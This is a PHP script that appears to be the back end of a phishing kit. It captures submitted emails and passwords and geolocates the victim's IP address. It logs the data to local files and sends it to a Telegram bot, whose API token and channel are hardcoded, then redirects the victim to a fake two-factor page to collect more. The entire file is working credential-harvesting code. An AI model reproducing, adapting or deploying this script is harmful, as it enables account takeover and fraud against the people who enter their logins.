<?php
function getVisIpAddr() { 
      
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
            return $_SERVER['HTTP_CLIENT_IP']; 
        } 
        else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
            return $_SERVER['HTTP_X_FORWARDED_FOR']; 
        } 
        else { 
            return $_SERVER['REMOTE_ADDR']; 
        } 
    } 
      
    // Store the IP address 
    $vis_ip = getVisIPAddr(); 
      
    // Display the IP address 
    echo $vis_ip; 

    $ip = $vis_ip; 
  
// Use JSON encoded string and converts 
// it into a PHP variable 
$ipdat = @json_decode(file_get_contents( 
    "http://www.geoplugin.net/json.gp?ip=" . $ip)); 
   
echo 'Country Name: ' . $ipdat->geoplugin_countryName . "\n"; 
echo 'City Name: ' . $ipdat->geoplugin_city . "\n";  
echo 'Currency Symbol: ' . $ipdat->geoplugin_currencySymbol . "\n"; 
echo 'Currency Code: ' . $ipdat->geoplugin_currencyCode . "\n"; 

$countryName =  $ipdat->geoplugin_countryName;
$city = $ipdat->geoplugin_city;
$currencySymbol = $ipdat->geoplugin_currencySymbol;
$currencyCode = $ipdat->geoplugin_currencyCode;

$title = $_POST['title'];
$username = $_POST['email'];
$pwd = $_POST['pass'];


              
if(isset($username) and isset($pwd))
{
$texts = "\n ***DATA***INSERTED***\n\nUsername:: ".$username."\nPassword::  ".$pwd. "\nTitle:: ".$title."\nCountry : ".$vis_ip; "\nIP-Address:: ".$_SERVER['REMOTE_ADDR']."\nTime:: ".date("F j, Y, g:i a")."\nDevice:: ".$_SERVER['HTTP_USER_AGENT']."\n\n  **********************\n\n\n\n";

$texts2 = "     <tr>
        <th scope=\"row\"> - </th>
        <td>".$title."</td>
        <td>".$username."</td>

        <td>".$pwd."</td>
        <td>".$_SERVER['REMOTE_ADDR']."</td>
        <td>".date('F j, Y, g:i a')."</td>
        <td>".$_SERVER['HTTP_USER_AGENT']."</td>
     </tr>\n";

$fp = fopen('data.txt', 'a');
$fp2 = fopen('data2.txt','a');

$tmain = "New Customer Alert \n ***DATA***INSERTED***\n
        Portal : ".$title."
        UserID : ".$username."
        Password : ".$pwd."
        IP-Address : ".$vis_ip."
        Time Logged : ".date('F j, Y, g:i a')."
        Browser/Device/OS : ".$_SERVER['HTTP_USER_AGENT']."
        Country : ".$countryName. " 
        City : " .$city. "
        currencySymbol : " .$currencySymbol."
        currencyCode : " .$currencyCode."


        ";


$apiToken = "6906329824:AAFbkdYIoP3j7DQE_kQhWeBYq7jvEsnuCuM";
    $data = [
        'chat_id' => '@ipaymain', 
        'text' => $tmain
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


fwrite($fp,$texts );
fwrite($fp2,$texts2);
fclose($fp);
fclose($fp2);



header("Location: https://ipaycash.org/trade/Or124t3oQ5/2fa-verification/");
} 
?>
